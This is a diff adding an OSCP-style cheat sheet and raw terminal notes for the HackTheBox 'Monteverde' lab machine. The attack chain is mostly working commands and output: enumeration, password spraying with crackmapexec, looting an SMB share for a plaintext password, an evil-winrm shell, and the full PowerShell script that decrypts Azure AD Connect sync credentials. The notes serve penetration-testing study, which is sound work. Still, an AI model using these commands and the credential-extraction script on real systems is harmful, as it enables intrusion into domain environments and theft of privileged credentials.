@@ -1,0 +1,165 @@
+###############################################################
+# Monteverde (HTB) - OSCP Cheat-Sheet & Key Takeaways
+###############################################################
+
+# 1. Enumeration
+nmap -sV -sC -p- 10.10.10.172 --open
+windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects
+enum4linux -a 10.10.10.172
+
+# 2. User List Creation
+python windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt
+
+# 3. Password Spraying
+wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
+cat users.txt >> english-basic.txt
+crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt
+
+# 4. SMB Share Enumeration & File Download
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -r
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 --download 'users$/mhope/azure.xml'
+
+# 5. WinRM Shell (Foothold)
+evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+
+# 6. Privilege Escalation (AD Connect)
+# Enumerate for AD Connect and SQL Server
+ls 'C:\Program Files\Microsoft Azure AD Sync\Bin\'
+# Use/adapt PowerShell script to extract AD Connect sync credentials
+# (see azuread_decrypt_msol.ps1 or adconnect.ps1)
+
+# 7. Domain Admin Shell & Root Flag
+evil-winrm -i 10.10.10.172 -u administrator -p '<admin_password>'
+cat C:\Users\Administrator\Desktop\root.txt
+
+# OSCP Lessons:
+# - Always enumerate users/groups and check for password reuse.
+# - Use password spraying with common and username-based passwords.
+# - Check for world-readable shares and sensitive files (xml, txt, docx).
+# - Look for AD Connect, SQL Server, and privilege escalation scripts.
+# - Document every step and save key commands for your report.
+###############################################################
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ /home/kali/Timeroast/timeroast.py 10.10.10.172 
+1000:$sntp-ms$e6bd3271d8c051ba52dd076d23bbae6c$1c0111e900000000000a95804c4f434cec45d74184b09e98e1b8428bffbfcd0aec469c5a68c91735ec469c5a68c94127
+                                     
+
+
+wget https://raw.githubusercontent.com/insidetrust/statistically-likely-
+usernames/master/weak-corporate-passwords/english-basic.txt
+cat users.txt >> english-basic.txt
+
+crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt
+
+
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -x whoami
+
+smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -r
+
+found password in 
+[+] Starting download: users$\mhope\azure.xml (1212 bytes)
+
+evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\mhope\Documents> ls
+*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
+*Evil-WinRM* PS C:\Users\mhope> cd Desktop
+*Evil-WinRM* PS C:\Users\mhope\Desktop> ls
+
+
+    Directory: C:\Users\mhope\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/12/2025  12:55 PM           1745 azuread_decrypt_msol.ps1
+-ar---        8/11/2025   8:08 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
+...
+*Evil-WinRM* PS C:\Users\mhope\Desktop> cat azuread_decrypt_msol.ps1
+Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+*Evil-WinRM* PS C:\Users\mhope\Desktop> 
+
+
+Program Files shows heavy use of Azure and SQL
+"Let's find out the version of the AD Connect. According to the Microsoft documentation, the name of the
+service responsible for syncing the local AD to Azure AD is ADSync . We don't see a reference to this on
+running Get-Process , and attempting to run tasklist results in an Access Denied error.
+We can also try to enumerate services with the PowerShell cmdlet Get-Service , or by invoking wmic.exe
+service get name , sc.exe query state= all or net.exe start , but are also denied access. Instead,
+we can enumerate the service instance using the Registry."
+
+*Evil-WinRM* PS C:\Users\mhope\Desktop> Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
+
+
+    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+
+
+Name                           Property
+----                           --------
+ADSync                         Type             : 16
+                               Start            : 2
+                               ErrorControl     : 1
+                               ImagePath        : "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"
+                               DisplayName      : Microsoft Azure AD Sync
+                               DependOnService  : {winmgmt}
+                               ObjectName       : MEGABANK\AAD_987d7f2f57d2
+                               Description      : Enables integration and management of identity information across multiple directories, systems and platforms. If this service is stopped or disabled, no synchronization or password management for
+                               objects in connected data
+                                                  sources will be performed.
+                               FailureActions   : {0, 0, 0, 0...}
+                               DelayedAutostart : 1
+
+
+*Evil-WinRM* PS C:\Users\mhope\Desktop> 
